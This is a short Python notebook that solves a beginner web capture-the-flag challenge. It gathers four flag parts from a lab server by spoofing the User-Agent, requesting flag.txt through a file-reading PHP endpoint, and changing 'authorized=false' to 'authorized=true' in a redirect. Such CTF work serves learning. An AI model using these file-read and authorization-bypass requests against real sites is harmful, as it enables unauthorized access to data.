```python
import requests
import re
```

```python
BASE_URL = 'https://300a5fa56ab00d17ae0ef098-1024-intro-web-2.challenge.cscg.live:1337/'
```

```python
flag_part_1_encapsuled = requests.get(f'{BASE_URL}/tram-ticket-machine.html', headers={'User-Agent': 'Mozilla/5.0 (Windows 95; Win64; x64)'}).text
flag_part_1 = 'CSCG{' + re.findall(r'flag = "(.+)"', flag_part_1_encapsuled)[0]
flag_part_1
```

```python
flag_part_2_encapsuled = requests.post(f'{BASE_URL}/read-file.php', data={'filename': 'flag.txt'}).text
flag_part_2 = re.findall(r'Flag part 2/4: (.*)</pre>', flag_part_2_encapsuled)[0]
flag_part_2
```

```python
flag_part_3_encapsuled = requests.get(f'{BASE_URL}/read-file.php?filename=flag.txt').text
flag_part_3 = re.findall(r'Flag part 3/4: (.*)</pre>', flag_part_3_encapsuled)[0]
flag_part_3
```

```python
flag_part_4_redirect = requests.get(f'{BASE_URL}/enter-security-gate.php', allow_redirects=False).headers['Location']
new_fp_4_redirect = flag_part_4_redirect.replace('authorized=false', 'authorized=true')
flag_part_4_encapsuled = requests.get(f'{BASE_URL}/{new_fp_4_redirect}').text
flag_part_4 = re.findall(r'Flag part 4/4: (.*)</pre>', flag_part_4_encapsuled)[0]
flag_part_4
```

```python
flag = flag_part_1 + flag_part_2 + flag_part_3 + flag_part_4
flag
```
